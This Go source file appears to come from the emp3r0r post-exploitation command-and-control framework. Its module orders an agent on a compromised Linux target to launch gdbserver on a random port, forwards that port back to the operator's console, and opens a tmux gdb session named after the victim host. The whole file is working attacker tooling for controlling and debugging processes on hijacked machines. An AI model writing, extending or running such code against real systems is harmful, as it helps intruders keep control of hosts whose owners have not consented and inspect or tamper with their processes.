//go:build linux
// +build linux

package cc

import (
	"context"
	"fmt"
	"strconv"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func moduleGDB() {
	// gdbserver listens on this port
	port := util.RandInt(1024, 65535)
	portstr := strconv.Itoa(port)

	gdbserver_path := RuntimeConfig.UtilsPath + "/gdbserver"
	gdbserver_cmd := fmt.Sprintf("%s --multi :%d",
		gdbserver_path, port)

	// tell agent to start gdbserver
	err := SendCmdToCurrentTarget(gdbserver_cmd, uuid.NewString())
	if err != nil {
		CliPrintError("Send `gdbserver` command to agent: %v", err)
		return
	}

	// forward gdbserver port to CC
	var pf PortFwdSession
	pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
	to := "127.0.0.1:" + portstr
	pf.Lport, pf.To = portstr, to
	go func() {
		err := pf.RunPortFwd()
		if err != nil {
			CliPrintError("moduleGDB: PortFwd failed: %v", err)
		}
	}()

	// wait for the port mapping to work
	for pf.Ctx.Err() == nil {
		time.Sleep(200 * time.Millisecond)
		for _, p := range PortFwds {
			if p.Agent == CurrentTarget && p.To == to {
				break
			}
		}
	}

	// connect to remote gdb session
	name := CurrentTarget.Hostname
	label := Targets[CurrentTarget].Label
	if label != "nolabel" && label != "-" {
		name = label
	}
	gdb_cmd := fmt.Sprintf("gdb")
	CliPrintInfo("Launching gdb session, please type `target extended-remote 127.0.0.1:%d` to get started", port)
	TmuxNewWindow(fmt.Sprintf("emp3r0r_gdb-%d/%s", port, name), gdb_cmd)
}
